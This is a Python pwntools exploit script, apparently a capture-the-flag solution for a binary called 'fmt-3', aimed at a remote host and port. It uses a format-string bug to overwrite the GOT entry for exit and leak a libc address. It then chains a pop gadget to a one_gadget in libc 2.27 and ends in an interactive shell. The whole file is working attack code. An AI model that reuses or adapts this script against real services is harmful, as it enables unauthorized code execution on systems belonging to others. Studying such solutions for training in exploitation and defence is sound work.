#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib

c = 0
pwn_file = "./fmt-3"
c = process(pwn_file, env={'LD_PRELOAD': './libc-2.27.so'})

elf = ELF(pwn_file)
lib = ELF('./libc-2.27.so')
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
#context.log_level = 'debug'


debug = 0
if debug == 1:
    gdb_script = 'b *0x401202'
    gdb.attach(c, gdb_script)
else:
    c = remote('140.110.112.77', '4004')

def write_exit_got(addr):
    assert(addr < 0x700000)
    payload = pwnlib.fmtstr.make_payload_dollar(6 + 3, pwnlib.fmtstr.AtomWrite(elf.got['exit'], 0x2, addr))
    print(payload)
    c.sendline(flat(payload[0], length=0x18) + payload[1])

def write_exit_got_goto(addr, rip):
    c.sendline('got')
    c.recvuntil('got')   
    assert(addr < 0x700000)
    payload = pwnlib.fmtstr.make_payload_dollar(6 + 4, pwnlib.fmtstr.AtomWrite(elf.got['exit'], 0x2, addr))
    print(payload)
    c.sendline(flat(payload[0], length=0x18) + p64(rip) + payload[1])

def list_stack():
    c.sendline('test')
    c.recvuntil('test')   
    print('test')
    for i in range(6, 50):
        c.sendline('!%{}$p!'.format(i))
        c.recvuntil('!')
        print(i, c.recvuntil('!'))


write_exit_got(0x4011b3)

# leak libc
c.sendline('libc')
c.recvuntil('libc')   
c.sendline('!%13$p!')
c.recvuntil('!')
libc_base = int(c.recvuntil('!')[:-1], 16) - 9 - lib.symbols['_IO_file_setbuf']
print(hex(libc_base))

one_gadget = libc_base + 0x4f2c5

pop4 = 0x0000000000401264 # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop1 = 0x000000000040126b # pop rdi ; ret
input()
write_exit_got_goto(pop4, rip=one_gadget)




#list_stack()

c.interactive()
c.close()
